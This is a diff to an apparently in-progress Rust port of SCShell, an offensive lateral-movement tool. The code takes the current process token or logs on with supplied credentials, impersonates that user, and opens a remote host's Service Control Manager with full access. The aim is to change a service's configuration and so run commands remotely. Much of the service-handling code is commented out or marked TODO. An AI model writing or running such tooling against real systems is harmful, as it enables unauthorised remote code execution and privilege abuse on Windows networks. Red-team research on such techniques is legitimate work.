@@ -7,10 +7,12 @@
 
 use std::io;
 use std::io::{stdin, stdout, Read, Write};
+use std::process::exit;
 use windows::core::PCSTR;
+use windows::core::Error;
 
 use windows::Win32::{
-    Foundation::{CloseHandle, BOOL, HANDLE},
+    Foundation::{CloseHandle, BOOL, HANDLE, GetLastError},
     Security::{
         ImpersonateLoggedOnUser, LogonUserA, LOGON32_LOGON_NEW_CREDENTIALS,
         LOGON32_PROVIDER_DEFAULT, SC_HANDLE, TOKEN_ALL_ACCESS,
@@ -19,7 +21,7 @@ use windows::Win32::{
         Memory::GPTR,
         Services::{
             ChangeServiceConfigA, OpenSCManagerA, OpenServiceA, QueryServiceConfigA,
-            QUERY_SERVICE_CONFIGA,
+            QUERY_SERVICE_CONFIGA, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS
         },
         Threading::{GetCurrentProcess, OpenProcessToken},
     },
@@ -83,18 +85,58 @@ fn SCShell(
             );
         } else {
             println!("[*] No username provided, stealing current process token");
-            OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &mut hToken);
+            OpenProcessToken(
+                GetCurrentProcess(),
+                TOKEN_ALL_ACCESS,
+              &mut hToken);
         }
        
         println!("[*] Token handle: {:x?}", hToken);
         breakpoint();
-        
-        // bResult = ImpersonateLoggedOnUser(hToken);
+
         let bResult: BOOL = ImpersonateLoggedOnUser(hToken);
+
         // Using the (made) token to open the SCmanager
 
-        // SC_HANDLE schManager = OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
-        // SC_HANDLE schService = OpenServiceA(schManager, serviceName, SERVICE_ALL_ACCESS);
+
+        let mut schManager: SC_HANDLE = SC_HANDLE(0);
+        let schManager_res: Result<SC_HANDLE, Error> = OpenSCManagerA(
+            target_host_ptr,
+            PCSTR(SERVICES_ACTIVE_DATABASE.as_ptr()),
+            SC_MANAGER_ALL_ACCESS);
+
+            println!("{:?}", schManager_res);
+
+        // TODO: figure why this match breaks and returns Err(schManager_res)
+        //     match schManager_res {
+        //         Ok(schManager_res) => {
+        //             let schManager:SC_HANDLE = schManager_res;
+        //             println!("[+] Service manager handle: {:?}", schManager)
+        //     },
+        //         Err(schManager_res) => {
+        //             println!("[-] Failed to open service manager.");
+        //             exit(1)
+        //     }
+        // }
+ 
+        breakpoint();
+
+        // let mut schService: SC_HANDLE = SC_HANDLE(0);
+        // let schService_res: Result<SC_HANDLE, Error> = OpenServiceA(
+        //     schManager,
+        //     PCSTR(service_name.as_ptr()),
+        //     SERVICE_ALL_ACCESS);
+
+        // match schService_res {
+        //     Ok(schService_res) => {
+        //         let schService:SC_HANDLE = schService_res;
+        //         println!("[+] Service manager handle: {:?}", schManager)
+        // },
+        //     Err(schManager_res) => {
+        //         println!("[-] Failed to open targeted service handle.");
+        //         exit(1)
+        // }
+    //}
 
         // QueryServiceConfigA(schService, NULL, 0, &dwSize);
 
